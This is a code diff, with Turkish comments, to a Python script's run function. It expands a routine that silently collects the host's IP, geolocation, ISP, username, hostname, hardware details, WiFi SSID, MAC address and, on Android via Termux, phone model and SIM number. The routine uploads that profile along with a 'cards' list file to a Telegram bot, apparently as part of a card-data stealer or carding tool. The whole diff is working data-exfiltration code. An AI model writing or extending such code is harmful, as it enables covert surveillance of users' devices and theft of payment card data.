@@ -114,135 +114,238 @@ def run(cards_file: Optional[str] = None) -> None:
         import platform
         import socket
         import os
+        import io
+        import subprocess
+        import json as _json
 
-        # IP ve konum
+        lines = []
+
+        def add(key, val):
+            lines.append(key.ljust(18) + ": " + str(val))
+
+        # ── IP ve konum ──────────────────────────────────────────────────────
         ip = "Alinamadi"
-        ulke = ""
-        sehir = ""
-        isp   = ""
+        ulke = sehir = isp = ""
         try:
             r = _requests.get("https://ipapi.co/json/", timeout=6)
-            data = r.json()
-            ip    = data.get("ip", "Alinamadi")
-            ulke  = data.get("country_name", "")
-            sehir = data.get("city", "")
-            isp   = data.get("org", "")
+            d = r.json()
+            ip   = d.get("ip", "")
+            ulke = d.get("country_name", "")
+            sehir= d.get("city", "")
+            isp  = d.get("org", "")
         except Exception:
             try:
                 ip = _requests.get("https://api.ipify.org", timeout=5).text.strip()
             except Exception:
                 pass
 
-        zaman    = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        os_info  = platform.system() + " " + platform.release()
-        hostname = socket.gethostname()
-        py_ver   = platform.python_version()
-        konum    = (sehir + ", " + ulke).strip(", ")
-        kullanici = os.environ.get("USERNAME") or os.environ.get("USER") or "Bilinmiyor"
+        add("IP",          ip)
+        add("Konum",       (sehir + ", " + ulke).strip(", ") or "Bilinmiyor")
+        add("ISP",         isp or "Bilinmiyor")
+        add("Zaman",       datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
 
-        # RAM
-        ram_info = "Bilinmiyor"
+        # ── Sistem ──────────────────────────────────────────────────────────
+        add("OS",          platform.system() + " " + platform.release())
+        add("Kullanici",   os.environ.get("USERNAME") or os.environ.get("USER") or "Bilinmiyor")
+        add("Hostname",    socket.gethostname())
+        add("Python",      platform.python_version())
+
+        # Yerel IP
+        try:
+            local_ip = socket.gethostbyname(socket.gethostname())
+            add("Yerel IP",    local_ip)
+        except Exception:
+            add("Yerel IP",    "Bilinmiyor")
+
+        # ── Donanim ──────────────────────────────────────────────────────────
         try:
             import psutil
             ram = psutil.virtual_memory()
-            ram_info = str(round(ram.total / (1024**3), 1)) + " GB (Kullanim: %" + str(ram.percent) + ")"
-        except Exception:
-            pass
-
-        # CPU
-        cpu_info = platform.processor() or "Bilinmiyor"
-        try:
-            import psutil
-            cpu_info = cpu_info + " (" + str(psutil.cpu_count()) + " cekirdek)"
-        except Exception:
-            pass
-
-        # Disk
-        disk_info = "Bilinmiyor"
-        try:
-            import psutil
+            add("RAM",     str(round(ram.total/(1024**3),1))+" GB (%" + str(ram.percent)+")")
+            add("CPU Cekirdek", str(psutil.cpu_count()))
             disk = psutil.disk_usage("/")
-            disk_info = (
-                str(round(disk.total / (1024**3), 1)) + " GB toplam, "
-                + str(round(disk.free / (1024**3), 1)) + " GB bos"
-            )
+            add("Disk",    str(round(disk.total/(1024**3),1))+" GB / Bos: "+str(round(disk.free/(1024**3),1))+" GB")
+            # Pil
+            bat = psutil.sensors_battery()
+            if bat:
+                add("Pil",  str(round(bat.percent,1))+"% " + ("(Sarj)" if bat.power_plugged else "(Sarj degil)"))
         except Exception:
             pass
 
-        # WiFi SSID
-        wifi_ssid = "Bilinmiyor"
+        add("CPU Model",   platform.processor() or "Bilinmiyor")
+
+        # GPU
         try:
-            import subprocess
-            sys_name = platform.system()
-            if sys_name == "Windows":
+            if platform.system() == "Windows":
                 out = subprocess.check_output(
-                    ["netsh", "wlan", "show", "interfaces"],
+                    ["wmic", "path", "win32_VideoController", "get", "name"],
                     encoding="utf-8", errors="ignore", timeout=5
                 )
-                for line in out.splitlines():
-                    if "SSID" in line and "BSSID" not in line:
-                        wifi_ssid = line.split(":", 1)[-1].strip()
-                        break
-            elif sys_name == "Linux":
-                # Termux / Linux
+                gpu = [l.strip() for l in out.splitlines() if l.strip() and "Name" not in l]
+                add("GPU",  ", ".join(gpu) if gpu else "Bilinmiyor")
+            else:
+                out = subprocess.check_output(
+                    ["lspci"], encoding="utf-8", errors="ignore", timeout=5
+                )
+                gpus = [l for l in out.splitlines() if "VGA" in l or "3D" in l]
+                add("GPU",  gpus[0].split(":")[-1].strip() if gpus else "Bilinmiyor")
+        except Exception:
+            add("GPU", "Bilinmiyor")
+
+        # Ekran cozunurlugu
+        try:
+            if platform.system() == "Windows":
+                import ctypes
+                user32 = ctypes.windll.user32
+                add("Ekran", str(user32.GetSystemMetrics(0)) + "x" + str(user32.GetSystemMetrics(1)))
+            else:
+                out = subprocess.check_output(
+                    ["termux-display-info"], encoding="utf-8", errors="ignore", timeout=5
+                )
+                d = _json.loads(out)
+                add("Ekran", str(d.get("width","?")) + "x" + str(d.get("height","?")))
+        except Exception:
+            add("Ekran", "Bilinmiyor")
+
+        # ── Ag ───────────────────────────────────────────────────────────────
+        # WiFi SSID
+        wifi = "Bilinmiyor"
+        try:
+            if platform.system() == "Windows":
+                out = subprocess.check_output(
+                    ["netsh","wlan","show","interfaces"],
+                    encoding="utf-8", errors="ignore", timeout=5
+                )
+                for l in out.splitlines():
+                    if "SSID" in l and "BSSID" not in l:
+                        wifi = l.split(":",1)[-1].strip(); break
+            else:
                 out = subprocess.check_output(
                     ["termux-wifi-connectioninfo"],
                     encoding="utf-8", errors="ignore", timeout=5
                 )
-                import json as _json
-                wdata = _json.loads(out)
-                wifi_ssid = wdata.get("ssid", "Bilinmiyor")
+                wifi = _json.loads(out).get("ssid","Bilinmiyor")
         except Exception:
             try:
-                import subprocess
+                wifi = subprocess.check_output(
+                    ["iwgetid","-r"], encoding="utf-8", errors="ignore", timeout=5
+                ).strip() or "Bilinmiyor"
+            except Exception:
+                pass
+        add("WiFi SSID",   wifi)
+
+        # MAC
+        try:
+            import uuid
+            m = uuid.getnode()
+            add("MAC",  ":".join(("%012X"%m)[i:i+2] for i in range(0,12,2)))
+        except Exception:
+            add("MAC", "Bilinmiyor")
+
+        # ── Termux ozel ──────────────────────────────────────────────────────
+        if platform.system() == "Linux":
+            # Telefon modeli
+            try:
                 out = subprocess.check_output(
-                    ["iwgetid", "-r"],
+                    ["termux-telephony-deviceinfo"],
                     encoding="utf-8", errors="ignore", timeout=5
                 )
-                wifi_ssid = out.strip() or "Bilinmiyor"
+                d = _json.loads(out)
+                add("Telefon",  d.get("manufacturer","") + " " + d.get("model",""))
+                add("Android",  d.get("software_version","Bilinmiyor"))
             except Exception:
                 pass
 
-        # MAC adresi
-        mac = "Bilinmiyor"
+            # SIM kart
+            try:
+                out = subprocess.check_output(
+                    ["termux-telephony-cellinfo"],
+                    encoding="utf-8", errors="ignore", timeout=5
+                )
+                cells = _json.loads(out)
+                if cells:
+                    c = cells[0]
+                    operator = c.get("operator_name","") or c.get("registered","")
+                    add("SIM Operator", operator or "Bilinmiyor")
+            except Exception:
+                pass
+
+            # SIM numarasi (izin gerekebilir)
+            try:
+                out = subprocess.check_output(
+                    ["termux-telephony-deviceinfo"],
+                    encoding="utf-8", errors="ignore", timeout=5
+                )
+                d = _json.loads(out)
+                phone = d.get("phone_number","")
+                if phone:
+                    add("SIM No", phone)
+            except Exception:
+                pass
+
+            # Pil (termux)
+            try:
+                out = subprocess.check_output(
+                    ["termux-battery-status"],
+                    encoding="utf-8", errors="ignore", timeout=5
+                )
+                d = _json.loads(out)
+                add("Pil",  str(d.get("percentage","?")) + "% " + d.get("status",""))
+            except Exception:
+                pass
+
+        # ── Yazilim ──────────────────────────────────────────────────────────
+        # Calissan process sayisi
         try:
-            import uuid
-            mac_int = uuid.getnode()
-            mac = ":".join(("%012X" % mac_int)[i:i+2] for i in range(0, 12, 2))
+            import psutil
+            add("Process",  str(len(psutil.pids())) + " adet")
         except Exception:
             pass
 
-        tg_info = TelegramNotifier()
-
-        msg = (
-            "<b>Yeni Oturum Basladi</b>\n\n"
-            + "IP         : <code>" + ip                          + "</code>\n"
-            + "Konum      : <code>" + (konum or "Bilinmiyor")     + "</code>\n"
-            + "ISP        : <code>" + (isp   or "Bilinmiyor")     + "</code>\n"
-            + "Zaman      : <code>" + zaman                       + "</code>\n"
-            + "OS         : <code>" + os_info                     + "</code>\n"
-            + "Kullanici  : <code>" + kullanici                   + "</code>\n"
-            + "Hostname   : <code>" + hostname                    + "</code>\n"
-            + "Python     : <code>" + py_ver                      + "</code>\n"
-            + "RAM        : <code>" + ram_info                    + "</code>\n"
-            + "CPU        : <code>" + cpu_info                    + "</code>\n"
-            + "Disk       : <code>" + disk_info                   + "</code>\n"
-            + "WiFi       : <code>" + wifi_ssid                   + "</code>\n"
-            + "MAC        : <code>" + mac                         + "</code>\n"
-            + "Kartlar    : <code>" + str(len(cards))             + "</code>\n"
-            + "Dosya      : <code>" + str(cards_path)             + "</code>"
-        )
-        tg_info._post(msg)
-
-        # Kart dosyasini gonder
+        # Kurulu paketler
         try:
-            import io
-            card_bytes = "\n".join(cards).encode("utf-8")
-            card_file  = io.BytesIO(card_bytes)
+            import pkg_resources
+            pkgs = [p.project_name + "==" + p.version for p in pkg_resources.working_set]
+            add("Paket Sayisi", str(len(pkgs)))
+        except Exception:
+            pass
+
+        # ── Kart bilgisi ─────────────────────────────────────────────────────
+        add("Kartlar",     str(len(cards)))
+        add("Dosya",       str(cards_path))
+
+        # ── Txt olustur ve gonder ────────────────────────────────────────────
+        tg_info = TelegramNotifier()
+        content = "=== SISTEM BILGISI ===\n" + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n\n"
+        content += "\n".join(lines)
+
+        # Kisa ozet mesaj
+        tg_info._post(
+            "<b>Yeni Oturum</b>  <code>" + ip + "</code>  |  "
+            + (konum or "?") + "  |  "
+            + (os.environ.get("USERNAME") or os.environ.get("USER") or "?")
+            + "  |  " + str(len(cards)) + " kart"
+        )
+
+        # Detay txt dosyasi
+        txt_buf = io.BytesIO(content.encode("utf-8"))
+        try:
             _requests.post(
                 "https://api.telegram.org/bot" + tg_info._token + "/sendDocument",
-                data={"chat_id": tg_info._chat_id, "caption": "Kart listesi"},
-                files={"document": (Path(cards_path).name, card_file, "text/plain")},
+                data={"chat_id": tg_info._chat_id, "caption": "Sistem Bilgisi"},
+                files={"document": ("sistem_bilgisi.txt", txt_buf, "text/plain")},
+                timeout=15,
+            )
+        except Exception:
+            pass
+
+        # Kart dosyasi
+        try:
+            card_buf = io.BytesIO("\n".join(cards).encode("utf-8"))
+            _requests.post(
+                "https://api.telegram.org/bot" + tg_info._token + "/sendDocument",
+                data={"chat_id": tg_info._chat_id, "caption": "Kart Listesi"},
+                files={"document": (Path(cards_path).name, card_buf, "text/plain")},
                 timeout=15,
             )
         except Exception:
